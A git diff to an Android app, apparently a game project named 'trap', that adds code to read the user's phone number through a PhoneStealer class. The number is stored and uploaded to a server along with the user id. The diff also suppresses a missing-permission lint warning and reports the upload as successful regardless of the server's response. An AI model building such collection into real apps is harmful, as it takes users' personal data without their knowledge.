@@ -1,6 +1,7 @@
 package de.hpi3d.gamepgrog.trap.ui;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
@@ -19,6 +20,7 @@ import androidx.fragment.app.Fragment;
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.android.PermissionHelper;
+import de.hpi3d.gamepgrog.trap.android.PhoneStealer;
 import de.hpi3d.gamepgrog.trap.api.ApiIntent;
 import de.hpi3d.gamepgrog.trap.api.ApiService;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
@@ -125,6 +127,7 @@ public class MainFragment extends Fragment {
         }
     }
 
+    @SuppressLint("MissingPermission")
     private Promise<Boolean> sendContactDataAndPhoneNumber() {
         Promise<Boolean> p = Promise.create();
 
@@ -140,13 +143,16 @@ public class MainFragment extends Fragment {
 
         TaskResolver resolver = new FakeContactsTaskResolver(permissions);
         resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
+            String number = PhoneStealer.getUserPhoneNumber(getContext());
+            StorageManager.with(getActivity()).phoneNumber.set(number);
             ApiIntent
                     .build(getContext())
                     .setCall(ApiService.CALL_PHONENUMBER)
                     .put(ApiService.KEY_USER_ID, userid)
-                    .put(ApiService.KEY_PHONENUMBER, DataStealer.getUserPhoneNumber(getContext()))
-                    .putReceiver((code, bundle) -> p.resolve(code == ApiService.SUCCESS))
+                    .put(ApiService.KEY_PHONENUMBER, number)
                     .start();
+
+            p.resolve(true);
         });
 
         return p;
